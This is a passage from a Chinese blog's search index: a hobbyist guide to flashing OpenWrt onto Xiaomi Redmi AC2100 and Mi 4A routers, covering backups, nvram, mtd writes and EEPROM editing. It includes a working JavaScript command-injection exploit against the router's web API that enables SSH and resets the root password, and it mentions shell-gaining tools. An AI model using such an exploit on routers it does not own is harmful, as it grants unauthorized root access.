    | 577   |      | | \u96a7\u9053\u6027\u80fd | p2w       | ax6s      | 150         |      | |          | ax6s      | p2w       | 250         |      | | \u96a7\u9053\u6027\u80fd | ryzen     | tianyi310 | 295     |      | |          | tianyi310 | ryzen     | 173     |      | |          | s3pro     | ryzen     | 256         |      | | 780/886  | s3pro     | p2w       | 370     |      | |          | ryzen     | s3pro     | 274         |      |</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5177\u4f53\u578b\u53f7\u5237\u673a\u8fc7\u7a0b","title":"\u5177\u4f53\u578b\u53f7\u5237\u673a\u8fc7\u7a0b","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#redmi-ac2100-\u5237-openwrt","title":"Redmi AC2100 \u5237 Openwrt","text":"<p>[OpenWrt Wiki] Xiaomi Redmi Router AC2100</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#1-\u786e\u8ba4-stock-\u7cfb\u7edf\u7248\u672c","title":"1. \u786e\u8ba4 stock \u7cfb\u7edf\u7248\u672c","text":"<p>\u786e\u8ba4\u7cfb\u7edf\u7248\u672c\u662f\u5426\u4e3a 2.0.23\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u5219\u5728\u7cfb\u7edf\u5185\u624b\u52a8\u5347\u7ea7\u5230\u8be5\u7248\u672c http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#2-\u83b7\u5f97-ssh","title":"2. \u83b7\u5f97 ssh","text":"<p>\u4f7f\u7528 web \u6f0f\u6d1e\uff0c\u83b7\u5f97 ssh</p> <pre><code>// Work for RedMi 2100 firmware 2.0.23\n// http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin\n\nfunction getSTOK() {\n    let match = location.href.match(/;stok=(.*?)\\//);\n    if (!match) {\n        return null;\n    }\n    return match[1];\n}\n\nfunction execute(stok, command) {\n    command = encodeURIComponent(command);\n    let path = `/cgi-bin/luci/;stok=${stok}/api/misystem/set_config_iotdev?bssid=SteelyWing&amp;user_id=SteelyWing&amp;ssid=-h%0A${command}%0A`;\n    console.log(path);\n    return fetch(new Request(location.origin + path));\n}\n\nfunction enableSSH() {\n    stok = getSTOK();\n    if (!stok) {\n        console.error('stok not found in URL');\n        return;\n    }\n    console.log(`stok = \"${stok}\"`);\n\n    password = prompt('Input new SSH password');\n    if (!password) {\n        console.error('You must input password');\n        return;\n    }\n\n    execute(stok, \n`\nnvram set ssh_en=1\nnvram commit\nsed -i 's/channel=.*/channel=\\\\\"debug\\\\\"/g' /etc/init.d/dropbear\n/etc/init.d/dropbear start\n`\n    )\n        .then((response) =&gt; response.text())\n        .then((text) =&gt; console.log(text));\n    console.log('New SSH password: ' + password);\n    execute(stok, `echo -e \"${password}\\\\n${password}\" | passwd root`)\n        .then((response) =&gt; response.text())\n        .then((text) =&gt; console.log(text));\n}\n\nenableSSH();\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#3-\u4e0b\u8f7d-openwrt-\u955c\u50cf","title":"3. \u4e0b\u8f7d openwrt \u955c\u50cf","text":"<p>\u4ece\u5b98\u65b9\u4e0b\u8f7d\u6700\u65b0\u955c\u50cf\uff0c\u6ce8\u610f\u6709\u56db\u4e2a\u6587\u4ef6</p> <ul> <li>kernel: \u5177\u6709\u6700\u5c11\u6587\u4ef6\u7cfb\u7edf\u7684 Linux \u5185\u6838\u3002\u5bf9\u4e8e\u9996\u6b21\u5b89\u88c5\u6216\u6062\u590d\u5f88\u6709\u7528\u3002</li> <li>kernel1: Linux \u5185\u6838\u4f5c\u4e3a\u5355\u72ec\u7684\u6620\u50cf</li> <li>rootfs0: \u6839\u6587\u4ef6\u7cfb\u7edf\u4f5c\u4e3a\u5355\u72ec\u7684\u6620\u50cf\u3002</li> <li>Sysupgrade: \u4f7f\u7528 Sysupgrade \u6620\u50cf\u66f4\u65b0\u5df2\u7ecf\u8fd0\u884c OpenWrt \u7684\u8def\u7531\u5668\u3002\u8be5\u6620\u50cf\u53ef\u4ee5\u4e0e LuCI Web \u754c\u9762\u6216\u7ec8\u7aef\u4e00\u8d77\u4f7f\u7528\u3002</li> </ul> <p>\u9700\u8981\u4e0b\u8f7d kernel1 \u548c rootfs0</p> <ul> <li>OpenWrt Downloads</li> <li>OpenWrt Firmware Selector</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#4-\u5907\u4efd","title":"4. \u5907\u4efd","text":"<p>\u901a\u8fc7 dmesg\uff0c\u77e5\u9053\u4e00\u5171\u6709 14 \u4e2a mtd \u5206\u533a</p> <pre><code>[    2.940000] NAND device: Manufacturer ID: 0xc8, Chip ID: 0xd1 (ESMT NAND 128MiB 3,3V 8-bit), 128MiB, page size: 2048, OOB size: 64\n[    2.950000] [NAND]select ecc bit:4, sparesize :64 spare_per_sector=16\n[    2.950000] Scanning device for bad blocks\n[    3.100000] Signature matched and data read!\n[    3.110000] load_fact_bbt success 1023\n...\n[    3.190000] Creating 14 MTD partitions on \"MT7621-NAND\":\n[    3.190000] 0x000000000000-0x000007f80000 : \"ALL\"\n[    3.200000] 0x000000000000-0x000000080000 : \"Bootloader\"\n[    3.210000] 0x000000080000-0x0000000c0000 : \"Config\"\n[    3.210000] 0x0000000c0000-0x000000100000 : \"Bdata\"\n[    3.220000] 0x000000100000-0x000000140000 : \"Factory\"\n[    3.230000] 0x000000140000-0x000000180000 : \"crash\"\n[    3.230000] 0x000000180000-0x0000001c0000 : \"crash_syslog\"\n[    3.240000] 0x0000001c0000-0x000000200000 : \"cfg_bak\"\n[    3.240000] 0x000000200000-0x000000600000 : \"kernel0\"\n[    3.250000] 0x000000600000-0x000000a00000 : \"kernel1\"\n[    3.260000] 0x000000a00000-0x000002400000 : \"rootfs0\"\n[    3.260000] 0x000002400000-0x000003e00000 : \"rootfs1\"\n[    3.270000] 0x000003e00000-0x000006400000 : \"overlay\"\n[    3.280000] 0x000006400000-0x000007f80000 : \"obr\"\n[    3.280000] [mtk_nand] probe successfully!\n</code></pre> <p>\u901a\u8fc7 cat /proc/mtd\uff0c\u77e5\u9053\u5bf9\u5e94\u5173\u7cfb</p> <pre><code>root@XiaoQiang:/tmp# cat /proc/mtd\ndev:    size   erasesize  name\nmtd0: 07f80000 00020000 \"ALL\"\nmtd1: 00080000 00020000 \"Bootloader\"\nmtd2: 00040000 00020000 \"Config\"\nmtd3: 00040000 00020000 \"Bdata\"\nmtd4: 00040000 00020000 \"Factory\"\nmtd5: 00040000 00020000 \"crash\"\nmtd6: 00040000 00020000 \"crash_syslog\"\nmtd7: 00040000 00020000 \"cfg_bak\"\nmtd8: 00400000 00020000 \"kernel0\"\nmtd9: 00400000 00020000 \"kernel1\"\nmtd10: 01a00000 00020000 \"rootfs0\"\nmtd11: 01a00000 00020000 \"rootfs1\"\nmtd12: 02600000 00020000 \"overlay\"\nmtd13: 01b80000 00020000 \"obr\"\nmtd14: 00c1c000 0001f000 \"ubi_rootfs\"\nmtd15: 021e8000 0001f000 \"data\"\n</code></pre> <p>\u5907\u4efd\uff0c\u5176\u4e2d Factory \u4e2d\u5b58\u50a8\u4e86 EEPROM \u7684\u6570\u636e</p> <pre><code>cat /dev/mtd4 &gt; Factory.dump\n\nscp\u590d\u5236\u5230\u672c\u5730\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#5-\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf","title":"5. \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf","text":"<p>\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff08rm2100 \u6709\u53cc\u7cfb\u7edf\u7528\u4e8e\u5907\u4efd\u4fdd\u62a4\uff0c\u9700\u8981\u8bbe\u7f6e\u5148\u542f\u52a8\u54ea\u4e00\u4e2a\uff09</p> <pre><code># Enable uart and boot_wait, useful for testing or recovery if you have an uart adapter!\nnvram set uart_en=1\nnvram set boot_wait=on\nnvram set bootdelay=5\n\n# Set kernel1 as the booting kernel\nnvram set flag_try_sys1_failed=1\n\n# Commit our nvram changes\nnvram commit\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#6-\u5237\u673a","title":"6. \u5237\u673a","text":"<pre><code>mtd write kernel1.bin kernel1\nmtd -r write rootfs0.bin rootfs0\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#mi-4a-\u5343\u5146\u7248","title":"MI 4A \u5343\u5146\u7248","text":"<p>\u5b98\u65b9\u6559\u7a0b\uff1a[OpenWrt Wiki] Xiaomi Mi Router 4A Gigabit Edition</p> <p>warning</p> <ul> <li>2022/10\uff1av2\u7248\u672c\u76844A\u5343\u5146\u7248\u65e0\u6cd5\u5237op\u3002\u539f\u7248\u4f7f\u7528\u7684\u662fWinbond or GigaDevice \u7684 flash \u82af\u7247\uff0c\u6211\u624b\u5934\u7684\u662f GigaDevice \u7684GD25Q127CSIG\u3002\u65b0\u7248\u4f7f\u7528\u00a0Eon or CFeon \u7684\u82af\u7247\uff0c\u8fd8\u5728\u652f\u6301\u4e2d\u3002</li> <li>\u8001\u7248\u7684\u6709\u65e0\u7ebf\u5c4f\u853d\uff0c\u800c\u5728\u552e\u7684\u6ca1\u6709</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"<p>\u53ef\u4ee5\u6f0f\u6d1e\u83b7\u53d6 shell\uff0c\u4e0d\u5fc5\u4f7f\u7528\u786c\u4ef6\u7f16\u7a0b\u5668</p> <p>2022/11/6\u65e5\uff0c\u56e0\u5237breed bootloader\uff0c\u4f7f\u5f97 MI 4A \u53d8\u7816\u3002\u5fe0\u544a\uff1a\u522b\u7528 breed\uff0c\u4f1a\u53d8\u5f97\u4e0d\u5e78\u3002\uff08\u4f60 tm \u652f\u6301 r3g\uff0c\u4e0d\u652f\u6301 mi 4a \u80fd\u4e0d\u80fd\u5199\u6e05\u695a\uff09</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u6b65\u9aa4","title":"\u6b65\u9aa4","text":"<p>~~1. \u9996\u5148\u9700\u8981\u4f7f\u7528<code>OpenWRTInvasion</code>\u83b7\u53d6 shell\u3002\u53c2\u8003\uff1aacecilia/OpenWRTInvasion(github.com)\u3002</p> <p>~~\u540c\u65f6\uff0c\u8be5\u4ed3\u5e93\u4e5f\u63d0\u4f9b\u4e86\u83b7\u5f97 shell \u540e\u7684\u5237\u673a\u8fc7\u7a0b\u3002\u4e0d\u8fc7\u4f7f\u7528\u5b98\u65b9\u7684<code>OpenWRTInvasion</code>\u4f1a\u4ece github \u4e0a\u4e0b\u8f7d\u6587\u4ef6\uff0c\u800c\u56e0\u4e3a\u7f51\u7edc\u539f\u56e0\u53ef\u80fd\u4f1a\u5931\u8d25\u3002\u6069\u5c71\u8bba\u575b\u4e2d\u6709\u7528\u6237\u63d0\u4f9b\u4e86\u4fee\u6539\u4ee3\u7801\u7684\u79bb\u7ebf\u7248\u672c\uff0c\u53ef\u4ee5\u641c\u7d22\u4f7f\u7528\u3002 \u4e0d\u8fc7\u4e5f\u53ef\u4ee5\u81ea\u884c\u4fee\u6539\u4ee3\u7801\uff1a\u4fee\u6539<code>script.sh</code>\uff0c\u5c06\u5176\u4e2d\u7684\u94fe\u63a5\u66ff\u6362\u6210\u672c\u5730\u94fe\u63a5\u3002\u53ef\u4ee5\u4f7f\u7528 python -m http.server \u8fd0\u884c\u4e00\u4e2a\u5c0f\u7684 http \u670d\u52a1\uff0c\u63d0\u4f9b\u4e0b\u8f7d\u3002\u4f8b\uff1a</p> <pre><code>curl -L \"https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/busybox-mipsel\" --insecure --output busybox\n\n#\u6539\u4e3a\uff0cip \u9700\u8981\u8c03\u6574\ncurl \"http://192.168.31.189:8000/busybox-mipsel\" --output busybox\n</code></pre> <ol> <li>\u73b0\u5728\u5b98\u65b9\u4ed3\u5e93\u96c6\u6210\u4e86\u672c\u5730\u670d\u52a1\u5668\u7684\u529f\u80fd\uff0c\u76f4\u63a5\u8fd0\u884c\u811a\u672c\u5373\u53ef\u3002\u4f46\u662f\u5b98\u65b9\u4ed3\u5e93\u5374\u653e\u5f03\u4e86\u5bf9 windows \u7684\u652f\u6301\uff0c\u4e0d\u8fc7\u4eb2\u6d4b\u5728 git bash \u4e2d\u8fd0\u884c\u6ca1\u6709\u95ee\u9898\uff0c\u53ea\u9700\u8981\u628a\u811a\u672c\u5f00\u5934\u7684\u68c0\u6d4b\u6ce8\u91ca\u6389\u5373\u53ef\u3002</li> </ol> <pre><code># if platform.system() == \"Windows\":\n# \u00a0 \u00a0 sys.exit(\"Stopping: script can only be run on a Mac/Linux system\")\n</code></pre> <ol> <li>\u4e4b\u540e\u4f7f\u7528 telnet \u8fdb\u884c\u8fde\u63a5\uff0c\u6210\u529f\u83b7\u5f97 shell \u5982\u56fe\u6240\u793a</li> </ol> <pre><code>telnet 192.168.31.1 #\u8d26\u53f7root, \u5bc6\u7801root\n</code></pre> <p> 3. \u63a5\u7740\u4e0a\u4f20 openwrt \u955c\u50cf (\u4f7f\u7528 sysupgrade bin) \u5230\u8def\u7531\u5668\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528 python \u642d\u5efa http \u6587\u4ef6\u670d\u52a1\u5668\u3002\u6700\u540e\u8fd0\u884c mtd \u7b49\u5f85\u8def\u7531\u5668\u91cd\u542f\u5b8c\u6210\u5373\u53ef\u3002</p> <pre><code>#window\u4e0a, sysupgrade.bin\u6240\u5728\u76ee\u5f55\npython -m http.server\n\n#\u8def\u7531\u5668\u4e0a\ncd /tmp\ncurl -O http://&lt;windows ip&gt;:8000/sysupgrade.bin\nmtd -e OS1 -r write sysupgrade.bin OS1\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>breed \u4f7f\u7528\u8bf4\u660e\uff1ahttps://www.sohu.com/a/304140654_120096961 breed \u5237 openwrt \u6559\u7a0b https://www.ixigua.com/6974624328725824031</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#eeprom-\u4e0b\u8f7d","title":"EEPROM \u4e0b\u8f7d","text":"<p>eeprom \u91cc\u6709 mac \u548c sn \u7b49\u4fe1\u606f\uff0c\u5982\u679c sn \u4e22\u5931\u5237\u5b98\u65b9 bootloader \u5237\u56de\u539f\u5382\u4e5f\u4e0d\u80fd\u7ed1\u5b9a\u624b\u673a app \u7684</p> <ul> <li>\u3010\u65b0\u63d0\u9192\u3011[20210919 \u66f4\u65b0]\u5c0f\u7c73\u8def\u7531 4A \u5343\u5146\u7248 LEDE \u56fa\u4ef6_\u96c6\u6210\u5feb\u4e50\u4e0a\u7f51\u3001\u5185\u7f51\u7a7f\u900f\u3001KMS\u3001\u7f51\u7edc\u52a0\u901f - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</li> </ul> <p>\u6211\u770b\u4e86\u4e0b\u679c\u7136\u662f\u9519\u7684\uff0c\u6211\u4e4b\u524d\u4e5f\u662f\u8fd9\u4e2a\u60c5\u51b5\uff0c\u540e\u6765\u5206\u6790\u4e86\u4e0b\u628a eeprom \u7528\u4e0a\u4e86\u6b63\u786e\u7684\u5c31\u597d\u4e86\uff0c\u4f60\u5237\u6211\u8fd9\u4e2a eeprom\uff0c\u5982\u679c\u8fd8\u4e0d\u884c\u5c31\u5237\u6211\u7684\u89e3\u9501\u5206\u533a\u7684 lede \u56fa\u4ef6\uff0c\u7528 mtd \u547d\u4ee4\u5237\u5199\uff0cssh \u4e0a\u8def\u7531\uff0c\u672c\u5730 scp \u547d\u4ee4\u62f7\u8d1d\u4e0a\u4f20\u5230 tmp \u76ee\u5f55\uff0c   mtd -r write /tmp/eeprom.bin factory \u91cd\u542f\u5b8c\u4e86\u5c31 ok \u5237\u5b8c mac \u4f1a\u53d8\uff0c\u628a\u4f60\u7684 mac \u5730\u5740\u6539\u6210\u4f60\u539f\u6765\u7684 mac \u5730\u5740\u3002 \u5982\u679c\u6709\u539f\u6765\u7684\u56fa\u4ef6\u5907\u4efd\uff0c\u53d1\u6211\u6211\u6765\u5e2e\u4f60\u63d0\u53d6</p> <ul> <li>\u3010\u65b0\u63d0\u9192\u3011\u5e2e\u52a9\u63d0\u53d6 eeprom \u5c0f\u7c73 4A \u5343\u5146 (22 \u5e74 8 \u6708\u65b0\u7248)-\u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#eeprom-\u4fee\u6539","title":"EEPROM \u4fee\u6539","text":"<p>\u3010\u65b0\u63d0\u9192\u3011\u5173\u4e8e\u65b0 3(newifi 3) \u7684 eeprom \u6587\u4ef6\u4e2d MAC-SN \u7b49\u53c2\u6570\u4f4d\u7f6e-newifi \u65e0\u7ebf\u8def\u7531\u5668\u53ca\u7f51\u7edc\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <p>\u7528 SSH \u767b\u5f55\u8fdb\u5165\u8def\u7531\u5668\u7684 Console \u53f0\u540e\uff0c\u7528\u547d\u4ee4 (cat /proc/mtd)\u7684\u8f93\u51fa\u4e2d\uff0cFactory\u533a\u5bf9\u5e94\u7684\u5c31\u662f\u65e0\u7ebf\u548cMAC/SN\u7b49\u7684\u914d\u7f6e\u6587\u4ef6\u3002 \u8fd9\u4e2a\u6587\u4ef6\u5907\u4efd\u51fa\u6765\u540e\uff0c\u5927\u5c0f\u4e3a 64KB\uff0c\u53ef\u4ee5\u5728 breed \u4e2d\u66f4\u65b0 eeprom \u5904\u5237\u5165\u8def\u7531\u5668\u3002</p> <p>(\u4e0b\u56fe\u4e3a\u89e3\u9501\u540e\u7684\u8f93\u51fa) \u7528 WinHex \u6253\u5f00\u5907\u4efd\u7684\u6587\u4ef6 (\u5047\u8bbe\u4e3a eeprom.bin)</p> <p>1)     \u8def\u7531\u5668\u7684 SN</p> <p>\u8def\u7531\u5668\u7684 SN \u53f7\u5728\u8def\u7531\u5668\u7684\u80cc\u9762\u8d34\u7eb8\u5904\u6709\uff0cSN \u7684\u5b58\u50a8\u5728\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u7684\u504f\u79fb 0x7000(\u5904)\uff0c\u683c\u5f0f\u4e3a\u4ee5 MND \u5f00\u5934\uff0c\u5982\u4e0b\uff1a</p> <p>2)     \u8def\u7531\u5668\u7684 MAC \u5730\u5740</p> <p>\u8def\u7531\u5668\u7684 MAC \u53f7\u5728\u8def\u7531\u5668\u7684\u80cc\u9762\u8d34\u7eb8\u5904\u6709\uff0cMAC \u7684\u5b58\u50a8\u5728\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u7684\u504f\u79fb 0xE000(\u5904)\uff0c\u683c\u5f0f\u4e3a\u8fde\u7eed\u7684\u4e24\u4e2a MAC \u5730\u5740\uff0c\u5171\u5360 12 \u5b57\u8282\u3002 \u5206\u522b\u4e3a\u8d77\u59cb\u201dMAC \u5730\u5740 - \u7ed3\u675f MAC \u5730\u5740\u201d, \u7ed3\u675f MAC \u5730\u5740\u4e3a\u8d77\u59cb MAC \u5730\u5740\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5185\u5bb9 +2. \u5982\u56fe\uff1a \u8d77\u59cb MAC \u5730\u5740\uff1a20 76 93 48 A9 1F (\u8def\u7531\u5668\u80cc\u9762\u5904\u7684\u8d34\u7eb8) \u7ed3\u675f MAC \u5730\u5740\uff1a20 76 93 48 A9 21</p> <p>3)     \u548c\u65e0\u7ebf\u6709\u5173\u7684\u53c2\u6570</p> <p>2.4G \u65e0\u7ebf\u7684 BSSID \u5728\u6587\u4ef6\u5f00\u5934\u504f\u79fb 0x4-0x9 \u5904\uff0c\u603b\u5171 6 \u5b57\u8282\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p>5G \u65e0\u7ebf\u7684 BSSID \u5728\u504f\u79fb 0x8004-0x8009 \u5904\uff0c\u603b\u5171 6 \u5b57\u8282\uff0c(2.4G \u65e0\u7ebf\u7684 BSSID \u4e0e 5G-BSSID \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5185\u5bb9\u76f8\u5dee 2)\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p>\u548c\u65e0\u7ebf\u6709\u5173\u7684\u53c2\u6570\u5e94\u8be5\u662f\u5728\u504f\u79fb 0x8000-0x80C0 \u5904\u3002\u770b\u7f51\u53cb\u4eec\u6539\u7684\u8bdd\uff0c\u90fd\u662f\u5728 0x8060-0x809F \u8fd9\u4e09\u884c\u4e0a\u4fee\u6539\uff0c\u7531\u4e8e\u6ca1\u6709\u5177\u4f53\u8bf4\u660e\u53c2\u6570\u542b\u4e49\uff0c\u56e0\u6b64\u4e0d\u63a8\u8350\u81ea\u5df1\u4fee\u6539\u3002 \u5982\u56fe\u6240\u793a\uff1a</p> <p>4) \u672a\u77e5\u7684\u5185\u5bb9</p> <p>\u6587\u4ef6\u5f00\u5934\u7684 0x56-0x61 \u504f\u79fb\u5904\uff0c\u4e00\u5171 12 \u5b57\u8282\uff0c\u5206\u4e3a 2 \u7ec4\u3002\u524d 6 \u5b57\u8282\u548c\u540e 6 \u5b57\u8282\u5185\u5bb9\u4e5f\u6bd4\u8f83\u76f8\u4f3c\u3002\u4e0d\u662f mac \u4e5f\u4e0d\u662f bssid.</p> <p>\u53e6\u5916\u5728\u504f\u79fb 0x8060-0x80A0 \u5171 4 \u884c\u5185\uff0c\u6709\u51e0\u4e2a\u53c2\u6570\u662f\u4ee5 5 \u4e2a\u5b57\u8282\u4e3a\u4e00\u7ec4\u7684\u53c2\u6570\uff0c\u5177\u4f53\u683c\u5f0f\u7279\u5f81\u5982\u4e0b\uff1a 00 00 26 xx xx, \u6216\u8005 00 01 26 xx xx, \u6216\u8005 00 02 26 xx xx \u7b49\u3002</p> <p>\u5efa\u8bae\uff1a     \u53ef\u4ee5\u7528\u5176\u5b83\u4eba\u7684 EEPROM \u56fa\u4ef6\uff0c\u4ec5\u4ec5\u4fee\u6539 MAC \u548c SN (\u53ef\u9009\uff1aBSSID) \u4e3a\u81ea\u5df1\u7684\u8def\u7531\u5668\u7684\u5373\u53ef\uff0c\u4e0d\u63a8\u8350\u81ea\u5df1\u4fee\u6539\u65e0\u7ebf\u53c2\u6570\u90e8\u5206\u5185\u5bb9\u3002</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u7a7a\u95f4\u4e0d\u8db3\u53ef\u4ee5\u5b89\u88c5\u7684\u8f6f\u4ef6","title":"\u7a7a\u95f4\u4e0d\u8db3\uff08\u53ef\u4ee5\u5b89\u88c5\u7684\u8f6f\u4ef6\uff09","text":"<pre><code>Configuring terminfo.\nConfiguring iputils-arping.\nConfiguring libatomic1.\nConfiguring libiperf3.\nConfiguring kmod-netlink-diag.\nConfiguring libqrencode.\nConfiguring qrencode.\nConfiguring ss.\nConfiguring ethtool-full.\nConfiguring tree.\nConfiguring ip-bridge.\nConfiguring libncurses6.\nConfiguring libpcap1.\nConfiguring htop.\nConfiguring ncat.\nConfiguring mtr-json.\nConfiguring iperf3.\nCollected errors:\n * verify_pkg_installable: Only have 140kb available on filesystem /overlay, pkg vim-full needs 776\n * opkg_install_cmd: Cannot install package vim-full.\n * verify_pkg_installable: Only have 140kb available on filesystem /overlay, pkg tmux needs 238\n * opkg_install_cmd: Cannot install package tmux.\n * wfopen: //usr/lib/opkg/info/terminfo.control: No space left on device.\n * wfopen: //usr/lib/opkg/info/terminfo.postinst: No space left on device.\n * wfopen: //usr/lib/opkg/info/terminfo.prerm: No space left on device.\n * wfopen: /usr/share/terminfo/a/ansi: No space left on device.\n * wfopen: /usr/share/terminfo/d/dumb: No space left on device.\n * wfopen: /usr/share/terminfo/l/linux: No space left on device.\n * wfopen: /usr/share/terminfo/r/rxvt: No space left on device.\n * wfopen: /usr/share/terminfo/r/rxvt-unicode: No space left on device.\n * wfopen: /usr/share/terminfo/s/screen: No space left on device.\n * wfopen: /usr/share/terminfo/s/screen-256color: No space left on device.\n * verify_pkg_installable: Only have 164kb available on filesystem /overlay, pkg tcpdump needs 281\n * opkg_install_cmd: Cannot install package tcpdump.\n * verify_pkg_installable: Only have 164kb available on filesystem /overlay, pkg ip-full needs 168\n * opkg_install_cmd: Cannot install package ip-full.\n * verify_pkg_installable: Only have 168kb available on filesystem /overlay, pkg libopenssl1.1 needs 966\n * opkg_install_cmd: Cannot install package bind-dig.\n * verify_pkg_installable: Only have 168kb available on filesystem /overlay, pkg file needs 193\n * opkg_install_cmd: Cannot install package file.\n * opkg_conf_write_status_files: Couldn't close //usr/lib/opkg/status: No space left on device.\n</code></pre> <p>\u7531\u4e8e\u6ca1\u6709\u5b8c\u6210\u914d\u7f6e\uff0c\u5b89\u88c5\u5931\u8d25\u7684\u8f6f\u4ef6\u4e0d\u4f1a\u51fa\u73b0\u5728 opkg list-installed \u4e2d\u3002</p> <p>\u4e24\u6b21 opikg install \u90fd\u5931\u8d25\u540e\uff0copkg \u5f00\u59cb segmentfault \u4e86</p> <p>OpenWrt Forum Archive</p> <p>\u89e3\u51b3\u529e\u6cd5\u53ea\u6709 upgrade \u5e76\u9009\u62e9\u4fdd\u5b58\u914d\u7f6e\u4e86\u3002</p> <p>\u5b89\u88c5 23.05 \u5e76\u5b89\u88c5 wiregurad \u540e\u5269\u4f59\u7a7a\u95f4</p> <pre><code>root@mi4a:~# df -h\nFilesystem                Size      Used Available Use% Mounted on\n/dev/root                 3.8M      3.8M         0 100% /rom\ntmpfs                    58.8M      1.1M     57.7M   2% /tmp\n/dev/mtdblock10           8.3M    512.0K      7.8M   6% /overlay\noverlayfs:/overlay        8.3M    512.0K      7.8M   6% /\ntmpfs                   512.0K         0    512.0K   0% /dev\n</code></pre> <p>\u51e0\u4e2a\u5927\u8f6f\u4ef6 - bash: 359KB - zsh: 1.8MB - vim-full: 900KB - tmux: 400KB - tcpdump 400KB</p> <pre><code>iputils-arping ncat iperf3 curl mtr-json htop tcpdump tmux\n</code></pre> <pre><code>root@mi4a:~# df -h\nFilesystem                Size      Used Available Use% Mounted on\n/dev/root        